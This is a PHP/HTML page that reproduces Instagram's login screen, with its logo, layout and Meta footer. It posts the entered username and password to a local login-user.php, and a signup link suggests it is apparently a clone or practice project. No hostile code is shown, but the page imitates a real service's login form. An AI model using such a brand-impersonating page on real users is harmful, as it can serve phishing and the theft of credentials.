<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <?php
    include("./bootstrap_css.php");
    ?>
    <title>Instagram Login</title>

    <style>
    .login-footer {
        width: 100%;
        position: fixed;
        left: 0;
        bottom: 0;
        background: #fff;
        color: #999;
        z-index: 100;
    }

    .footer-links a {
        color: #999;
        text-decoration: none;
        margin: 0 6px;
    }

    .footer-links a:hover {
        text-decoration: underline;
    }

    @media (max-width: 991.98px) {
        .login-footer {
            position: static !important;
            margin-top: 32px;
        }

        .footer-links {
            font-size: 12px !important;
        }

        .footer-meta {
            font-size: 12px !important;
        }
    }

    @media (max-width: 575.98px) {
        .login-footer {
            font-size: 11px !important;
            padding-left: 2px;
            padding-right: 2px;
        }

        .footer-links {
            font-size: 11px !important;
        }

        .footer-meta {
            font-size: 11px !important;
        }
    }

    @media (max-width: 991.98px) {
        .row.flex-lg-row {
            flex-direction: column !important;
        }

        .col-lg-6,
        .col-lg-4 {
            max-width: 100%;
            flex: 0 0 100%;
        }

        .col-lg-6 img {
            margin-bottom: 24px;
        }
    }

    @media (max-width: 575.98px) {
        .container {
            padding-left: 8px;
            padding-right: 8px;
        }

        .instagram-logo {
            width: 120px !important;
        }
    }
    </style>
</head>

<body>
    <div class="container min-vh-100 d-flex justify-content-center align-items-center">
        <div class="row w-100 justify-content-center align-items-center flex-lg-row flex-column">
            <div class="col-lg-6 d-flex justify-content-center align-items-center mb-4 mb-lg-0">
                <img src="insta-login-image.png" alt="" style="max-width:420px; width:100%; height:auto;">
            </div>
            <div class="col-lg-4 d-flex justify-content-center align-items-center">
                <div style="width:100%; max-width:350px;">
                    <form action="login-user.php" method="POST">
                        <img src="https://www.citypng.com/public/uploads/preview/-11590321548vfiwckfjs3.png"
                            width="150px" alt="" class="instagram-logo d-block mx-auto text-center mb-3">
                        <input type="text" class="form-control rounded-1 my-2" style="background-color:#FAFAFA"
                            placeholder="Phone number, username, or email" name="username" required>
                        <input type="password" class="form-control rounded-1 my-2" style="background-color:#FAFAFA"
                            placeholder="Password" name="password" required>
                        <button type="submit" class="btn btn-info rounded-3 btn-sm w-100 text-white">Login</button>
                    </form>
                    <div class="d-flex gap-2 align-items-center my-2">
                        <hr class="w-100">
                        <p class="m-0 fw-semibold">OR</p>
                        <hr class="w-100">
                    </div>
                    <div class="d-flex gap-2 align-items-center my-2 justify-content-center">
                        <i class="bi bi-facebook text-primary"></i>
                        <p class="text-primary m-0 fw-semibold">Login with facebook</p>
                    </div>
                    <p class="text-dark fw-semibold text-center">Forgot Password</p>
                    <p class="text-center fw-semibold">
                        Don't have an account? <a href="signup.php"
                            class="text-primary fw-semibold text-decoration-none">Sign up</a>
                    </p>
                </div>
            </div>
        </div>
    </div>


    <div class="login-footer text-center py-3 px-2">
        <div class="footer-links mb-1" style="font-size:14px; color:#999;">
            Meta · About · Blog · Jobs · Help · API · Privacy · Terms · Locations · Instagram Lite · Threads · Contact
            Uploading & Non-Users · Meta Verified
        </div>
        <div class="footer-meta" style="font-size:13px; color:#999;">
            <span>English</span> © 2025 Instagram from Meta
        </div>
    </div>


</body>

</html>